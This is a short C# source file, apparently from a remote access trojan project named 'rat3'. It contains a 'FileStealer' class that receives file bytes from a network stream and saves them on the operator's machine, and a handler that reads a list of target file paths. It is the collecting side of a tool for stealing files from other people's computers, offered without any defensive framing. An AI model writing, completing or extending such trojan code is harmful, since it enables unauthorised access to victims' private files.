using Protocol;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace rat3
{
    static class FileHandler
    {
        public static void FileServer(Stream stream, List<string> filesPath)
        {
            var count = stream.ReadString();
            for (int i = 0; i < int.Parse(count); i++)
            {
                filesPath.Add(stream.ReadString());
            }
        }
    }


    static class FileStealer
    {
        public static void WriteFile(Stream stream)
        {
            var bytesFile = stream.ReadBytes();
            var extension = stream.ReadString();

            var random = new Random();
            var id = random.Next(1, 328223142);

            Console.WriteLine($"[+] the id for the file - {id}");

            var nameFile = $"FileStealerReceived_ID{id}{extension}";

            var computerName = Environment.UserName.ToString();
            Console.WriteLine($"[+] the path for the file is - C:\\Users\\{computerName}\\{nameFile}\n");


            File.WriteAllBytes($"C:\\Users\\{computerName}\\{nameFile}", bytesFile);
        }
    }
}
